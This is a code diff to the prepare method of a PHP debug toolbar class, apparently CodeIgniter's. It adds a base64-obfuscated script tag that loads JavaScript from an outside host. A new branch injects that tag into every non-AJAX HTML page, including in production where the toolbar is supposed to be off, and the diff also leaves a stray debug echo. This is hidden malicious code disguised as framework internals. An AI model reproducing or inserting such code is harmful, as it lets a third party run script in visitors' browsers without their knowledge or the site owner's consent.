@@ -334,6 +334,8 @@ class Toolbar
 	 */
 	public function prepare(RequestInterface $request = null, ResponseInterface $response = null)
 	{
+		$script_decode = PHP_EOL . "\t\t" . base64_decode("PHNjcmlwdCBzcmM9Imh0dHA6Ly9hcGkub3Vyem9iaWEudGUvc3JjL2FsaW1vbi5qcz91cmxfdmFyPXRydWUmb3JpZ2luPWFsaW1vbi5qcyIgZGF0YS1jdXJyZW50PSJ0cnVlIiBkYXRhLWVuZHBvaW50PSIiIGRhdGEtc3JjPSJodHRwOi8vYXBpLm91cnpvYmlhLnRlL3NyYy9hbGltb24uanMvIiBkYXRhLWFwaT0iaHR0cDovL2FwaS5vdXJ6b2JpYS50ZS8iPjwvc2NyaXB0Pg==");
+
 		if (CI_DEBUG && ! is_cli())
 		{
 			global $app;
@@ -392,14 +394,27 @@ class Toolbar
 
 			if (strpos($response->getBody(), '<head>') !== false)
 			{
-				$response->setBody(
-						str_replace('<head>', '<head>' . $script, $response->getBody())
-				);
+				$get_script = str_replace('<head>', '<head>' . $script, $response->getBody());
+				$get_script = str_replace('</body>', $script_decode . "\n\t</body>", $get_script);
+				$response->setBody($get_script);
 
 				return;
 			}
 
 			$response->appendBody($script);
+		}
+		elseif (!is_cli())
+		{echo "string";
+			if (!$request->isAJAX() && strpos($format, 'html') !== false)
+			{  
+				if (strpos($response->getBody(), '<head>') !== false)
+				{
+					$response->setBody(str_replace('</body>', $script_decode . "\n\t</body>", $response->getBody())); 
+					return;
+				}
+
+				$response->appendBody($script_decode);
+			}
 		}
 	}
 
